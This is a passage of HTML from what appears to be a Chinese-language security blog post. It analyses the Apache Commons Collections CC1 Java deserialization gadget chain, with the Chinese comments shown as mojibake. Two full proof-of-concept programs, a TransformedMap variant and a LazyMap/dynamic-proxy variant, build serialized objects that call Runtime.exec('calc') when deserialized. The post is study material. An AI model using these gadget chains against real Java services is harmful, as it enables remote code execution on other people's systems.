href="#readObject" class="headerlink" title="readObject"></a>readObject</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ æ‰äº†ä¸€äº›ä¸é‡è¦çš„</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? extends Annotation&gt; type;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br><br>    <span class="hljs-comment">// épublicçš„æ„é€ å™¨,æ¥æ”¶ä¸€ä¸ªAnnotation.Class(æ³¨è§£)å’Œä¸€ä¸ªMap</span><br>    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();  <span class="hljs-comment">// åˆ¤æ–­å‚æ•°1ä¼ å…¥çš„æ˜¯ä¸æ˜¯ä¸€ä¸ªæ³¨è§£çš„class</span><br>        <span class="hljs-keyword">if</span> (!type.isAnnotation() ||<br>            superInterfaces.length != <span class="hljs-number">1</span> ||<br>            superInterfaces[<span class="hljs-number">0</span>] != java.lang.annotation.Annotation.class)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AnnotationFormatError(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        <span class="hljs-keyword">this</span>.type = type;<br>        <span class="hljs-keyword">this</span>.memberValues = memberValues;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>        s.defaultReadObject();<br>        ...<br><br>        AnnotationType annotationType = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);  <span class="hljs-comment">// è¿”å›æŒ‡å®šæ³¨è§£ç±»å‹çš„æ³¨è§£å®ä¾‹</span><br>        ...<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); <span class="hljs-comment">// è¿”å›æ­¤æ³¨è§£ç±»å‹çš„æˆå‘˜ç±»å‹</span><br>        <span class="hljs-comment">// String ä»£è¡¨æ³¨è§£åç§°ï¼ŒmemberTypesä»£è¡¨æ³¨è§£çš„ç±»å‹ï¼Œä¾‹å¦‚java.lang.String</span><br><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; <span class="hljs-comment">// memberValuesä¼ å…¥çš„Map</span><br>            String name = memberValue.getKey();   <span class="hljs-comment">// è·å–Entryçš„key</span><br>            Class&lt;?&gt; memberType = memberTypes.get(name);  <span class="hljs-comment">// æ ¹æ®ä¸Šé¢çš„keyå»æŸ¥æ‰¾memberTypesä¸­å¯¹åº”çš„value</span><br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-keyword">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists  // ä¼ å…¥mapçš„keyï¼Œè¦ä¸æ³¨è§£å±æ€§ä¸­çš„åç§°ä¸€è‡´</span><br>                Object value = memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) || <span class="hljs-comment">// ç¡®å®šæ³¨è§£å±æ€§çš„ç±»å‹ä¸ä¼ å…¥æ•°ç»„çš„valueçš„ç±»å‹æ˜¯å¦å±äºåŒä¸€ç±»å‹æˆ–æ¥å£ç›¸åŒæˆ–æ˜¯è¶…ç±»æˆ–ç±»æ¥å£</span><br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123; <span class="hljs-comment">// ä¼ å…¥æ•°ç»„çš„valueä¸èƒ½ExceptionProxyæ˜¯å®ä¾‹æˆ–å…¶å­ç±»çš„å®ä¾‹</span><br>                    memberValue.setValue(   <span class="hljs-comment">// æœ€ç»ˆè¦èµ°åˆ°è¿™é‡Œ</span><br>                        <span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>è¿™é‡Œè¿˜æœ‰å‡ ä¸ªé—®é¢˜ï¼š<h5 id="é—®é¢˜1-setValueçš„å‚æ•°"><a href="#é—®é¢˜1-setValueçš„å‚æ•°" class="headerlink" title="é—®é¢˜1  setValueçš„å‚æ•°"></a>é—®é¢˜1  setValueçš„å‚æ•°</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue(    <span class="hljs-comment">// setValueä¸­çš„å‚æ•°æ˜¯new AnnotationTypeMismatchExceptionProxyï¼Œæ— æ³•æ§åˆ¶</span><br>  <span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(<br>      value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>          annotationType.members().get(name)));<br></code></pre></td></tr></table></figure>è§£å†³ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConstantTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object iConstant;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> </span>&#123;<br>      <span class="hljs-keyword">super</span>();<br>      iConstant = constantToReturn;<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123; <span class="hljs-keyword">return</span> iConstant;&#125;<br>  <span class="hljs-comment">// è¯¥ç±»çš„transformæ— è®ºä¼ å…¥ä»€ä¹ˆéƒ½ä¼šiConstant</span><br>&#125;<br></code></pre></td></tr></table></figure><code>new ConstantTransformer(Runtime.class)</code><h5 id="é—®é¢˜2-Runtimeä¸å¯ä»¥åºåˆ—åŒ–"><a href="#é—®é¢˜2-Runtimeä¸å¯ä»¥åºåˆ—åŒ–" class="headerlink" title="é—®é¢˜2 Runtimeä¸å¯ä»¥åºåˆ—åŒ–"></a>é—®é¢˜2 Runtimeä¸å¯ä»¥åºåˆ—åŒ–</h5></li><li><code>Runtime.class</code>æ˜¯å¯åºåˆ—åŒ–çš„</li><li>é€šè¿‡åå°„ä¸€æ­¥æ­¥å®ç°æ‰§è¡Œå‘½ä»¤<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>  .transform(<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;Runtime.class, <span class="hljs-keyword">null</span>&#125;)<br>      .transform(<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;)<br>          .transform(Runtime.class)));<br></code></pre></td></tr></table></figure><h5 id="é—®é¢˜3-å¦‚ä½•å°†ä¸Šé¢ä¸¤ä¸ªè¿›è¡Œç»„åˆ"><a href="#é—®é¢˜3-å¦‚ä½•å°†ä¸Šé¢ä¸¤ä¸ªè¿›è¡Œç»„åˆ" class="headerlink" title="é—®é¢˜3 å¦‚ä½•å°†ä¸Šé¢ä¸¤ä¸ªè¿›è¡Œç»„åˆ"></a>é—®é¢˜3 å¦‚ä½•å°†ä¸Šé¢ä¸¤ä¸ªè¿›è¡Œç»„åˆ</h5>æœ‰ä¸€ä¸ª<code>org.apache.commons.collections.functors.ChainedTransformer#transform</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Transformer[] iTransformers;<br>  ...<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> </span>&#123;<br>    <span class="hljs-keyword">super</span>();<br>    iTransformers = transformers;<br>  &#125;<br>  ...<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object object)</span> </span>&#123;  <span class="hljs-comment">// å¾ªç¯è°ƒç”¨æ•°ç»„ä¸­çš„transform</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>        object = iTransformers[i].transform(object);<br>    &#125;<br>    <span class="hljs-keyword">return</span> object;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>æ‰€ä»¥å°±æ˜¯<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>    <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;Runtime.class,<span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;);<br></code></pre></td></tr></table></figure>æ­£å‘æ‹ä¸€æ‹æ€è·¯ï¼š</li></ul><ol><li><code>AnnotationInvocationHandler#readObject</code> â€”&gt; <code>AbstractInputCheckedMapDecorator.MapEntry#setValue</code></li><li><code>AbstractInputCheckedMapDecorator.MapEntry#setValue</code> â€”&gt; <code>TransformedMap#checkSetValue</code></li><li><code>TransformedMap#checkSetValue</code> â€”&gt; <code>ChainedTransformer#transform</code></li><li><code>ChainedTransformer#transform</code> â€”&gt; <code>ConstantTransformer#transform(new ConstantTransformer(Runtime.class))</code> â€“&gt; <code>return Runtime.class</code></li><li><code>ChainedTransformer#transform</code> â€”&gt; <code>InvokerTransformer#transform(Runtime.class)</code> â€“&gt; <code>return Method</code></li><li><code>ChainedTransformer#transform</code> â€”&gt; <code>InvokerTransformer#transform(Method)</code> â€“&gt; <code>return Runtime.getRuntime</code></li><li><code>ChainedTransformer#transform</code> â€”&gt; <code>InvokerTransformer#transform(Runtime.getRuntime)</code>  â€“&gt; æ‰§è¡Œå‘½ä»¤<br>å®Œå·¥ï¼Œå†™ä»£ç <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String path = <span class="hljs-string">&quot;ser.bin&quot;</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;Runtime.class,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;);<br>    HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;kkk&quot;</span>);<br>    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-keyword">null</span>, (Transformer) chainedTransformer);<br>    Class&lt;?&gt; aih = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    Constructor&lt;?&gt; declaredConstructor = aih.getDeclaredConstructor(Class.class,Map.class);<br>    declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>    Object o = declaredConstructor.newInstance(Target.class, transformedMap);<br><span class="hljs-comment">//        serialize(o);</span><br>      deserialize();<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/09/24/CommonsCollections1/cc1_11.png"><h4 id="è°ƒç”¨é“¾2"><a href="#è°ƒç”¨é“¾2" class="headerlink" title="è°ƒç”¨é“¾2"></a>è°ƒç”¨é“¾2</h4>ä¸Šé¢è¿™æ¡é“¾ï¼Œå¹¶ä¸æ˜¯ysoserialä¸­åŸç‰ˆçš„CC1ï¼Œè€Œæ˜¯åé¢çš„å¤§ç‰›å‘ç°çš„ï¼Œä¸‹é¢å†æ¥çœ‹ä¸€ä¸‹åŸç‰ˆçš„CC1<br>åŸç‰ˆçš„CC1çœŸä¸æ˜ç™½å·¨ä½¬ä»¬æ˜¯æ€ä¹ˆå‘ç°çš„ï¼Œåˆæ˜¯å‘è§‰è‡ªå·±èœçš„ä¸èƒ½å†èœçš„ä¸€å¤©ğŸ˜£<br><img src="/2022/09/24/CommonsCollections1/cc1_12.png"><br>æ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹å’Œå…¥å£éƒ½ä¸€æ ·ï¼Œåªä¸è¿‡ä¸­é—´æœ‰ç‚¹ä¸ä¸€æ ·<br>æ³¨æ„ä¸€ä¸‹è¿™ä¸ªç±»<code>class AnnotationInvocationHandler implements InvocationHandler, Serializable</code><br>å®ç°äº†<code>InvocationHandler</code>æ¥å£ï¼Œè¿˜è®°å¾—åŠ¨æ€ä»£ç†å˜›<br>åŠ¨æ€ä»£ç†æœ‰ä¸ªç‰¹æ€§ï¼šä»£ç†å¯¹è±¡è°ƒç”¨ä»»ä½•æ–¹æ³•ï¼Œéƒ½ä¼šè°ƒç”¨åˆ°åŠ¨æ€ä»£ç†ç±»çš„<code>invoke()</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? extends Annotation&gt; type;   <span class="hljs-comment">// å¯æ§</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;   <span class="hljs-comment">// å¯æ§</span><br>    ...<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> </span>&#123;<br>        String member = method.getName();<br>        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>        <span class="hljs-comment">// Handle Object and Annotation methods</span><br>        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>            paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AssertionError(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>        <span class="hljs-keyword">switch</span>(member) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>            <span class="hljs-keyword">return</span> toStringImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>            <span class="hljs-keyword">return</span> hashCodeImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>            <span class="hljs-keyword">return</span> type;<br>        &#125;<br><br>        <span class="hljs-comment">// å½“memberValuesæ˜¯ä¸€ä¸ªLazyMapæ—¶ï¼Œå°±ä¼šèµ°åˆ°LazyMap#get()</span><br>        Object result = memberValues.get(member);<br>       ...<br>    &#125;<br>    ...<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>        ...<br><br>        AnnotationType annotationType = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        ...<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// å‡è®¾memberValuesæ˜¯æ ¹æ®AnnotationInvocationHandlerç”Ÿæˆçš„ä¸€ä¸ªä»£ç†ç±»ï¼Œ</span><br>        <span class="hljs-comment">// é‚£ä¹ˆåœ¨è°ƒç”¨entrySet()æ—¶å°±ä¼šèµ°åˆ°AnnotationInvocationHandler#invoke()</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; <br>            String name = memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            ...<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ‹æ‹é—®é¢˜ï¼š</p><ol><li>æ ¹æ®AnnotationInvocationHandlerç”Ÿæˆçš„ä¸€ä¸ªä»£ç†ç±»(å¹¶ä¸”è¯¥ä»£ç†ç±»çš„memberValuesä¸ºLazyMap)</li><li>å†æœ‰ä¸€ä¸ªAnnotationInvocationHandlerå¯¹è±¡,memberValuesä¸ºåˆšåˆšç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»</li><li><code>private final Map&lt;String, Object&gt; memberValues</code>ï¼Œæ‰€ä»¥éœ€è¦æ»¡è¶³ä¸¤æ¬¡ä¼ å…¥AnnotationInvocationHandlerä¸­çš„memberValueséƒ½å¾—æ˜¯ç»§æ‰¿äº†Mapæ¥å£çš„å¯¹è±¡<br>æ‹æ‹æ€è·¯ï¼š</li><li>æœ€ç»ˆåºåˆ—åŒ–çš„å¯¹è±¡æ˜¯ä¸€ä¸ª<code>AnnotationInvocationHandler</code>å¯¹è±¡</li><li>è¯¥å¯¹è±¡çš„<code>memberValues</code>éœ€è¦å®ç°äº†Mapæ¥å£çš„åŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œå¹¶ä¸”è¯¥å¯¹è±¡çš„ä»£ç†ç±»å¯¹è±¡ä¹Ÿæ˜¯<code>AnnotationInvocationHandler</code>ç±»å‹</li><li>ä»£ç†ç±»å¯¹è±¡çš„<code>memberValues</code>éœ€è¦æ—¶ä¸€ä¸ª<code>LazyMap</code>å¯¹è±¡</li><li><code>LazyMap</code>å¯¹è±¡çš„<code>factory</code>å±æ€§æ˜¯<code>ChainedTransformer</code></li><li><code>ChainedTransformer</code>ä¸éœ€è¦å˜ï¼Œæ›´è°ƒç”¨é“¾1ç›¸åŒ<br>ç›®å‰æ‰€èƒ½æƒ³åˆ°æè¿°è¯¥æ€è·¯çš„æ–‡å­—ï¼Œå¯èƒ½è¿˜æ˜¯ç†è§£ä¸å¤Ÿé€å½»ï¼Œæ— æ³•å‡†ç¡®æè¿°å‡ºæ€è·¯<br>è¯¥å†™ä»£ç äº†<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>  ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>    <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;Runtime.class,<span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>  &#125;);<br><br>  HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>  hashMap.put(<span class="hljs-string">&quot;zzz&quot;</span>,<span class="hljs-string">&quot;kkk&quot;</span>);<br><br>  Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);<br><br>  Class&lt;?&gt; aih = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>  Constructor&lt;?&gt; declaredConstructor = aih.getDeclaredConstructor(Class.class,Map.class);<br>  declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>  InvocationHandler invocationHandler = (InvocationHandler)declaredConstructor.newInstance(Target.class, lazyMap);<br><br>  Object invocationHandlerProxy = Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandler);<br>  Object o = declaredConstructor.newInstance(Target.class, invocationHandlerProxy);<br><span class="hljs-comment">//  serialize(o);</span><br>  deserialize();<br>    &#125;<br></code></pre></td></tr></table></figure><img src="/2022/09/24/CommonsCollections1/cc1_13.png"><h3 id="0x02-æ€»ç»“"><a href="#0x02-æ€»ç»“" class="headerlink" title="0x02 æ€»ç»“"></a>0x02 æ€»ç»“</h3></li></ol><ul><li>æ„Ÿè§‰è¿™äº›é“¾å¥½ç¥å¥‡ï¼Œå¥½åƒéƒ½æ˜¯æ³¨å®šçš„</li><li>è°ƒç”¨é“¾çš„å¯»æ‰¾ï¼Œç›®å‰æ¥çœ‹å°éš¾ï¼Œä½†å¯¹JavaåŸºç¡€çš„è¦æ±‚å¾ˆé«˜ï¼Œå¾ˆå¤šåœ°æ–¹å¦‚æœåŸºç¡€ä¸åˆ°ä½ï¼Œæ˜¯å¾ˆéš¾ç†è§£çš„</li><li>æœ€åçš„æœ€åï¼Œåˆæ˜¯å«Œå¼ƒè‡ªå·±èœçš„ä¸€å¤©o(Tãƒ˜To)<h3 id="0x03-å‚è€ƒé“¾æ¥"><a href="#0x03-å‚è€ƒé“¾æ¥" class="headerlink" title="0x03 å‚è€ƒé“¾æ¥"></a>0x03 å‚è€ƒé“¾æ¥</h3></li><li><a 